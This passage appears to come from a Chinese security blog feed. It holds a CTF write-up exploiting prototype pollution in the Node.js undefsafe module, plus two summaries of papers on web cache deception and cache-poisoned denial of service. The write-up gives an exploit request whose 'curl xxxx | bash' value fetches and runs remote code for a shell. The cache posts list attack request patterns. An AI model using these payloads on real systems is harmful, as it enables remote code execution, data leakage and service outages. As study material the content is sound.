req.body.author;</span><br><span class="line">        let raw = req.body.raw;</span><br><span class="line">        if (author &amp;&amp; raw) &#123;</span><br><span class="line">            notes.write_note(author, raw);</span><br><span class="line">            res.render(&apos;mess&apos;, &#123;message: &quot;add note sucess&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&apos;mess&apos;, &#123;message: &quot;did not add note&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(&apos;/edit_note&apos;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&apos;mess&apos;, &#123;message: &quot;please use POST to edit a note&quot;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let id = req.body.id;</span><br><span class="line">        let author = req.body.author;</span><br><span class="line">        let enote = req.body.raw;</span><br><span class="line">        if (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(&apos;mess&apos;, &#123;message: &quot;edit note sucess&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&apos;mess&apos;, &#123;message: &quot;edit note failed&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(&apos;/delete_note&apos;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&apos;mess&apos;, &#123;message: &quot;please use POST to delete a note&quot;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let id = req.body.id;</span><br><span class="line">        if (id) &#123;</span><br><span class="line">            notes.remove_note(id);</span><br><span class="line">            res.render(&apos;mess&apos;, &#123;message: &quot;delete done&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&apos;mess&apos;, &#123;message: &quot;delete failed&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(&apos;/notes&apos;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        let q = req.query.q;</span><br><span class="line">        let a_note;</span><br><span class="line">        if (typeof(q) === &quot;undefined&quot;) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(&apos;note&apos;, &#123;list: a_note&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">app.route(&apos;/status&apos;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        let commands = &#123;</span><br><span class="line">            &quot;script-1&quot;: &quot;uptime&quot;,</span><br><span class="line">            &quot;script-2&quot;: &quot;free -m&quot;</span><br><span class="line">        &#125;;</span><br><span class="line">        for (let index in commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;shell:&apos;/bin/bash&apos;&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                if (err) &#123;</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                console.log(`stdout: $&#123;stdout&#125;`);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(&apos;OK&apos;);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(function(req, res, next) &#123;</span><br><span class="line">    res.status(404).send(&apos;Sorry cant find that!&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(function(err, req, res, next) &#123;</span><br><span class="line">    console.error(err.stack);</span><br><span class="line">    res.status(500).send(&apos;Something broke!&apos;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const port = 8080;</span><br><span class="line">app.listen(port, () =&gt; console.log(`Example app listening at http://localhost:$&#123;port&#125;`))</span><br></pre></td></tr></table></figure></p><p>我们注意到其使用了undefsafe模块，那么如果我们可以操纵其第2、3个参数，即可进行原型链污染，则可使目标网站存在风险。故此首先查看undefsafe的调用点：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">get_note(id) &#123;</span><br><span class="line">    var r = &#123;&#125;</span><br><span class="line">    undefsafe(r, id, undefsafe(this.note_list, id));</span><br><span class="line">    return r;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">edit_note(id, author, raw) &#123;</span><br><span class="line">    undefsafe(this.note_list, id + &apos;.author&apos;, author);</span><br><span class="line">    undefsafe(this.note_list, id + &apos;.raw_note&apos;, raw);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>发现在查看note和编辑note时会调用undefsafe，那我们首先查看get_note方法会被哪个路由调用：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">app.route(&apos;/notes&apos;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        let q = req.query.q;</span><br><span class="line">        let a_note;</span><br><span class="line">        if (typeof(q) === &quot;undefined&quot;) &#123;</span><br><span class="line">            a_note = notes.get_all_notes();</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            a_note = notes.get_note(q);</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(&apos;note&apos;, &#123;list: a_note&#125;);</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure></p><p>此时发现参数q可控，但对于undefsafe的3个参数，我们并不能完整控制第3个参数。<br>而对于edit_note方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">app.route(&apos;/edit_note&apos;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&apos;mess&apos;, &#123;message: &quot;please use POST to edit a note&quot;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let id = req.body.id;</span><br><span class="line">        let author = req.body.author;</span><br><span class="line">        let enote = req.body.raw;</span><br><span class="line">        if (id &amp;&amp; author &amp;&amp; enote) &#123;</span><br><span class="line">            notes.edit_note(id, author, enote);</span><br><span class="line">            res.render(&apos;mess&apos;, &#123;message: &quot;edit note sucess&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&apos;mess&apos;, &#123;message: &quot;edit note failed&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure></p><p>我们发现edit_note路由中会调用，同时此时id,author和raw均为我们的可控值，那么我们则可以操纵原型链进行污染:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">edit_note(id, author, raw) &#123;</span><br><span class="line">    undefsafe(this.note_list, id + &apos;.author&apos;, author);</span><br><span class="line">    undefsafe(this.note_list, id + &apos;.raw_note&apos;, raw);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>那么既然找到了可以进行原型链污染的位置，就要查找何处可以利用污染的值造成攻击，我们依次查看路由，发现<code>/status</code>路由有命令执行的操作：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">app.route(&apos;/status&apos;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        let commands = &#123;</span><br><span class="line">            &quot;script-1&quot;: &quot;uptime&quot;,</span><br><span class="line">            &quot;script-2&quot;: &quot;free -m&quot;</span><br><span class="line">        &#125;;</span><br><span class="line">        for (let index in commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;shell:&apos;/bin/bash&apos;&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                if (err) &#123;</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                console.log(`stdout: $&#123;stdout&#125;`);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(&apos;OK&apos;);</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure></p><p>我们进行简单测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">const undefsafe = require(&apos;undefsafe&apos;);</span><br><span class="line"></span><br><span class="line">var note_list = &#123;&#125;</span><br><span class="line">var id = &apos;__proto__.aaa&apos;</span><br><span class="line">var author = &apos;skysec hack u!&apos;</span><br><span class="line">undefsafe(note_list, id + &apos;.author&apos;, author);</span><br><span class="line"></span><br><span class="line">let commands = &#123;</span><br><span class="line">    &quot;script-1&quot;: &quot;uptime&quot;,</span><br><span class="line">    &quot;script-2&quot;: &quot;free -m&quot;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">for (let index in commands)&#123;</span><br><span class="line">    console.log(commands[index])</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>此时输出为:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uptime</span><br><span class="line">free -m</span><br><span class="line">skysec hack u!</span><br></pre></td></tr></table></figure></p><p>那么为什么我们遍历commands的时候，会遍历到原型中我们污染增加的属性呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Statements/for...in</span><br></pre></td></tr></table></figure></p><p>在文档中可以看到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">for...in 循环只遍历可枚举属性（包括它的原型链上的可枚举属性）。像 Array和 Object使用内置构造函数所创建的对象都会继承自Object.prototype和String.prototype的不可枚举属性，例如 String 的 indexOf()  方法或 Object的toString()方法。循环将遍历对象本身的所有可枚举属性，以及对象从其构造函数原型中继承的属性（更接近原型链中对象的属性覆盖原型属性）。</span><br></pre></td></tr></table></figure></p><p>因此我们可以利用原型链污染的问题，增加一个我们可控的属性，利用status的命令执行功能令其执行。<br>那么对于exp的构造就非常简单了，首先构造原型链污染：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POST /edit_note</span><br><span class="line"></span><br><span class="line">id=__proto__.aaa &amp; author = curl xxxx | bash &amp; raw = skysec;</span><br></pre></td></tr></table></figure></p><p>再访问<code>/status</code>路由，利用污染后的结果进行命令执行，即可获得shell，进行RCE。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>原型链污染的攻击还是非常有意思的，下次可以多分析几个XD.</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;undefsafe是Nodejs的一个第三方模块，其核心为一个简单的函数，用来处理访问对象属性不存在的报错问题，其具有巨大的用户量：&lt;br&gt;
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
      <category term="cve" scheme="http://skysec.top/tags/cve/"/>
    
  </entry>
  
  <entry>
    <title>Web缓存利用分析(三)</title>
    <link href="http://skysec.top/2020/06/12/Web%E7%BC%93%E5%AD%98%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90(%E4%B8%89)/"/>
    <id>http://skysec.top/2020/06/12/Web缓存利用分析(三)/</id>
    <published>2020-06-12T10:44:01.000Z</published>
    <updated>2020-06-13T08:41:31.936Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前一篇文章介绍了Server Cache Poisoning在实际应用场景下，产生DOS攻击的利用方式。本篇文章则介绍Web Cache Deception在真实场景下的应用方式和测试情况。<br>本篇文章介绍的是发表在网络安全顶会2020 USENIX Security上的一篇文章：《Cached and Confused: Web Cache Deception in the Wild 》。</p><h2 id="背景知识"><a href="#背景知识" class="headerlink" title="背景知识"></a>背景知识</h2><p>我们已经在之前的文章中介绍过Web Cache欺骗的问题，其在CTF场景下有比较多的应用，而本篇文章主要聚焦于其在真实世界场景下的利用与一些bypass方式。关于其简单原理的一些CTF应用，可以参见我们的第一篇文章：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.4hou.com/posts/RwoL</span><br></pre></td></tr></table></figure></p><p><img src="/images/2020-06-12-21-57-41.png" alt="">如上图所示，攻击者诱导受害者点击如下路由：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/account.php/nonexistent.jpg</span><br></pre></td></tr></table></figure></p><p>由于是第一次访问，Web Cache将其转发给源服务器，源服务器在解析时，由于中间件或者后端配置问题，将其解析为访问/account.php路由，并进行response，而此时Web Cache将其对应记录。当攻击者再次请求如下链接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/account.php/nonexistent.jpg</span><br></pre></td></tr></table></figure></p><p>那么将会得到受害者account.php页面的内容，从而导致信息泄露，达成攻击。</p><h2 id="工具设计"><a href="#工具设计" class="headerlink" title="工具设计"></a>工具设计</h2><p>对于这样一个问题，本文作者设计了一套工具，并测试其在真实世界下的效果如何：<br><img src="/images/2020-06-12-22-01-47.png" alt=""><br>首先作者表明，利用该攻击的场景为：网站有一些私有信息，只能由用户访问，但因为Web Cache欺骗，致使其他用户可以访问到这些数据。这就是一次WCD(Web Cache Deception)攻击。<br>首先作者进行了网站搜集，其建立一个种子池，然后使用启发式工具，发现池中网站的子域名，以此扩充数据集。然后对每个网站进行账户创建，此时分别创立2个用户：攻击者用户与受害者用户。此举旨在后期利用攻击者用户获取受害者用户数据。同时还会使用爬虫搜集攻击者与受害者的cookies信息，以判断WCD攻击是否需要依赖于Cookies。<br>值得注意的是，在搜集网站的时候，由于是利用种子池中的域名，进行启发式搜集，那么可能会存在如下情况，即爬虫可能遇到大量相似的url：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/?lang=en</span><br><span class="line">http://example.com/?lang=fr</span><br><span class="line">http://example.com/?lang=cn</span><br></pre></td></tr></table></figure></p><p>亦或是如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/028</span><br><span class="line">http://example.com/142</span><br><span class="line">http://example.com/359</span><br></pre></td></tr></table></figure></p><p>这样的遍历和循环非常的浪费时间，于是作者设置了上限，诸如此类的url，每个域名只随机挑选500个。<br>在上述准备工作完毕后，则使用工具以此测试每个url是否存在WCD攻击隐患。攻击做法如下：</p><ol><li>对于指定url：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/028</span><br></pre></td></tr></table></figure></li></ol><p>首先在其路径后拼接随机数.css文件：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://example.com/028/&lt;random&gt;.css</span><br></pre></td></tr></table></figure></p><ol><li>使用受害者账户点击上述网址</li><li>使用攻击者账户点击上述网址，并记录回显</li><li>再次点击上述网址，但此时不带任何cookie，并记录回显<br>然后对搜集到的response进行提取，查看里面是否有受害者账户的关键信息，同时判断response中是否带出安全相关属性，例如:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">csrf、xsrf、token、state、client-id</span><br></pre></td></tr></table></figure></li></ol><h2 id="实验评估"><a href="#实验评估" class="headerlink" title="实验评估"></a>实验评估</h2><p>作者首先在Alexa Top 5K网站中，选取了295个支持Google OAuth的网站，选取分布如下：<br><img src="/images/2020-06-12-22-12-51.png" alt=""><br>然后将其作为种子池，进行爬取并测试，结果发现如下：<br><img src="/images/2020-06-12-22-13-31.png" alt=""><br>在1470410个网页中，有17293个页面存在WCD攻击，同时发现对于使用Cloudflare和Akamai CDN的网站可能更容易受到威胁：<br><img src="/images/2020-06-12-22-14-06.png" alt=""><br>同时在受到WCD的网页中，其可以泄露的私密数据分布如下：<br><img src="/images/2020-06-12-22-15-19.png" alt=""><br>可以看到不仅用户名泄露较为严重，Sess ID、Auth Code等安全相关的信息泄露也存在一定比例。<br>并且通过对照观察，在使用cookie和不使用cookie时，攻击结果一致，这也说明WCD攻击不依赖于授权用户或带有cookie的访问者。这进一步提升了该攻击的危害性，降低了其攻击成本。<br>同时，作者还提出了相应的bypass方式，其发现不仅诸如如下请求方式可以进行WCD攻击：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/account.php/nonexistent.jpg</span><br></pre></td></tr></table></figure></p><p>使用其他一些手段也可以达成相应的目的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/account.php%0Anonexistent.jpg</span><br><span class="line">/account.php%3Bnonexistent.jpg</span><br><span class="line">/account.php%23nonexistent.jpg</span><br><span class="line">/account.php%3Fnonexistent.jpg</span><br></pre></td></tr></table></figure></p><p>同时作者进一步加大了数据集，用于测试新的payload方式，同时发现其分布如下：<br><img src="/images/2020-06-12-22-19-05.png" alt=""><br>可见这些bypass方式可以有效的进行WCD攻击。<br>同时这些攻击也可以并存，例如既可以使用%0A进行WCD攻击，也可以使用%3F进行WCD攻击：<br><img src="/images/2020-06-12-22-20-41.png" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>本篇文章作者分析探索了真实世界中WCD攻击的应用和分布比例，同时提出了一些新型的WCD攻击绕过方式，对于之后的测试或者做题中具有一定指导意义。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;前一篇文章介绍了Server Cache Poisoning在实际应用场景下，产生DOS攻击的利用方式。本篇文章则介绍Web Cache D
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>Web缓存利用分析(二)</title>
    <link href="http://skysec.top/2020/06/12/Web%E7%BC%93%E5%AD%98%E5%88%A9%E7%94%A8%E5%88%86%E6%9E%90(%E4%BA%8C)/"/>
    <id>http://skysec.top/2020/06/12/Web缓存利用分析(二)/</id>
    <published>2020-06-12T09:31:39.000Z</published>
    <updated>2020-06-12T12:15:15.469Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在上一篇文章中，大致介绍了一些关于Web Cache的攻击方式及CTF中的一些出现。而本篇文章则会聚焦于Web Cache在学术前沿的一些攻击利用方式的探究。<br>本篇文章介绍的是发表在网络安全顶会2019 CCS的文章《Your Cache Has Fallen: Cache-Poisoned Denial-of-Service Attack》，主要介绍关于Server Cache Poisoning在真实世界的利用，以及所带来的Dos攻击。</p><h2 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h2><p>关于什么是Server Cache Poisoning，还不知道的同学可以在之前的文章中做一些了解：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.4hou.com/posts/RwoL</span><br></pre></td></tr></table></figure></p><p>由于Server Cache的存在，第一个访问者的request显得尤为重要，稍有不慎，那么就可能缓存下一个恶意的response，使后来的访问者受到威胁：<br><img src="/images/2020-06-12-17-36-38.jpg" alt=""><br>那么本篇文章研究的就是这个问题，即利用恶意的request，使Cache缓存恶意的response，让访问者受到拒绝服务攻击：<br><img src="/images/2020-06-12-17-39-57.png" alt=""><br>通过特定的request，可以使目标网站缓存不同的response，例如使静态资源，甚至网站不可用：<br><img src="/images/2020-06-12-17-40-34.png" alt=""></p><h2 id="方法实现"><a href="#方法实现" class="headerlink" title="方法实现"></a>方法实现</h2><p>那么应该发送怎样的request，才会使Server Cache缓存恶意的request，从而导致拒绝服务攻击呢？<br><img src="/images/2020-06-12-17-50-03.png" alt=""><br>我们可以看到，攻击者可以发送一个带有恶意值(X-Malicious-Header)的request请求，而由于该请求是第一次请求，因此其不存在于Cache中，于是交由Origin Server进行处理，但是由于http header中存在非法值，导致Origin Server解析时出现400的错误，并进行response，而此时由于Cache服务器的设置问题，其错误的将请求example.org/index.html的请求，判定为response为400，从而导致以后的访问者再次访问该页面时，只能得到页面400错误的response，从而达成Dos攻击。<br>那么具体上，我们可以发送哪些恶意value使网站出现解析异常呢？<br>作者在此提出3种攻击方式：</p><ul><li>HTTP Method Override (HMO) Attack</li><li>HTTP Header Oversize (HHO) Attack</li><li>HTTP Meta Character (HMC) Attack<h3 id="HTTP-Method-Override-HMO-Attack"><a href="#HTTP-Method-Override-HMO-Attack" class="headerlink" title="HTTP Method Override (HMO) Attack"></a>HTTP Method Override (HMO) Attack</h3>对于HMO攻击，作者发现存在一些http header可以更改请求方式，例如如下几种：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-HTTP-Method-OverrideX-HTTP-MethodX-Method-Override</span><br></pre></td></tr></table></figure></li></ul><p>假设请求发送形式为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1</span><br><span class="line">Host: example.org</span><br><span class="line">X-HTTP-Method-Override: POST</span><br></pre></td></tr></table></figure></p><p>此时服务器则会认为该请求为POST请求，于是会返回：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 404 Not Found</span><br><span class="line">Content-Length: 29</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">POST on /index.html not found</span><br></pre></td></tr></table></figure></p><p>从而导致请求资源方式的错误，以至于Cache服务器缓存404页面，而以后的用户，如果正常通过GET访问该网址，则会导致DOS攻击，回显404 Not Found:<br><img src="/images/2020-06-12-17-49-53.png" alt=""></p><h3 id="HTTP-Header-Oversize-HHO-Attack"><a href="#HTTP-Header-Oversize-HHO-Attack" class="headerlink" title="HTTP Header Oversize (HHO) Attack"></a>HTTP Header Oversize (HHO) Attack</h3><p>对于HHO攻击，作者发现，如果request请求中某个http header属性值异常长，那么会导致目标服务器解析出现400 Bad Request问题。<br>那么假设攻击者请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1</span><br><span class="line">Host: example.org</span><br><span class="line">X-Oversized-Header: Big value</span><br></pre></td></tr></table></figure></p><p>则目标服务器将返回:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 400 Bad Request</span><br><span class="line">Content-Length: 20</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Header size exceeded</span><br></pre></td></tr></table></figure></p><p>那么当普通用户请求该网址时，就会访问到Cache中所记录的400 Bad Request页面，从而导致拒绝服务攻击。<br><img src="/images/2020-06-12-17-50-50.png" alt=""><br>但该攻击为什么会发生呢？我们知道例如CDN，是会对过长的request进行拦截的，并不会进行缓存或者发送至源服务器。<br>但对于一个request请求，其header长度通常被限制在8000 bytes以下，而例如Amazon CloudFront CDN允许的header长度却为24,713 bytes。因此如果攻击者发送的header长度为10000bytes，是可以通过CDN的拦截，并产生危害的。</p><h3 id="HTTP-Meta-Character-HMC-Attack"><a href="#HTTP-Meta-Character-HMC-Attack" class="headerlink" title="HTTP Meta Character (HMC) Attack"></a>HTTP Meta Character (HMC) Attack</h3><p>对于HMC攻击，作者发现为了防止CRLF攻击，通常http会禁止value中带有\n或\r等符号，但由于Cache对此可能并不做过滤，那么就会产生语义上的gap，假设攻击者发送请求：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1</span><br><span class="line">Host: example.org</span><br><span class="line">X-Metachar-Header: \n</span><br></pre></td></tr></table></figure></p><p>由于该请求为第一次请求，Cache服务器将其转发给源服务器，而源服务器解析由于遇到危险字符，将会返回：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 400 Bad Request</span><br><span class="line">Content-Length: 21</span><br><span class="line">Content-Type: text/plain</span><br><span class="line">Character not allowed</span><br></pre></td></tr></table></figure></p><p>但由于Cache服务器对这些字符未必有过滤，于是将其对应缓存下来，那么当正常用户访问该页面时，将受到400 Bad Request的回显，从而产生Dos攻击。<br><img src="/images/2020-06-12-17-50-55.png" alt=""></p><h2 id="实验测试"><a href="#实验测试" class="headerlink" title="实验测试"></a>实验测试</h2><p>作者为了验证自己的3种攻击方式的可用性，其选择5个较为出名的proxies caches以及10个CDN：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Apache HTTP Server (Apache HTTPD) v2.4.18</span><br><span class="line">Nginx v1.10.3,</span><br><span class="line">Varnish v6.0.1</span><br><span class="line">Apache Traffic Server (Apache TS) v8.0.2 </span><br><span class="line">Squid v3.5.12 </span><br><span class="line">Akamai</span><br><span class="line">CloudFront</span><br><span class="line">Cloudflare</span><br><span class="line">Stackpath</span><br><span class="line">Azure</span><br><span class="line">CDN77</span><br><span class="line">CDNSun</span><br><span class="line">Fastly</span><br><span class="line">KeyCDN</span><br><span class="line">G-Score Labs</span><br></pre></td></tr></table></figure></p><p>首先，为了达成Dos攻击，那么要求上述缓存服务器必须可以缓存400 / 500等http状态的页面，于是作者先对其做了测试：<br><img src="/images/2020-06-12-18-02-56.png" alt=""><br>我们可以发现，只有Varnish, Apache TS, Akamai, Azure, CDN77, Cloudflare, CloudFront可以缓存400 / 500的页面,那么后面的攻击测试也将聚焦于此。<br>首先是HMO攻击，对于请求方式覆盖的http属性，作者先测试了一下哪些后端框架是可以接受的：<br><img src="/images/2020-06-12-18-05-25.png" alt=""><br>不难发现，Play1、Symfony、Lavarel框架都是默认支持这一方式的，那么如果后端使用上述框架之一，都可能遭受HMO攻击的影响。<br>对于HHO攻击，由于其关键点在于header限制长度语义不对等的问题，于是作者测试了一些现有web框架，CDN等header限制的长度：<br><img src="/images/2020-06-12-18-07-36.png" alt=""><br>从图中不难看出，假设目标网站使用Play2作为网站后端框架，使用Azure作为缓存，那么即可能遭受HHO攻击，产生Dos攻击，因为Play2的header长度限制为8319bytes，而Azure为24567bytes，如果攻击者发送10000bytes的header进行request，那么就可能被缓存下400 Bad Request的状态。<br>对于HMC攻击，由于其依赖于服务端对http header中关键字符的过滤，而缓存服务器则无视的语义差异，于是作者也做了相应的测试：<br><img src="/images/2020-06-12-18-10-36.png" alt=""><br>我们可以看到，当http 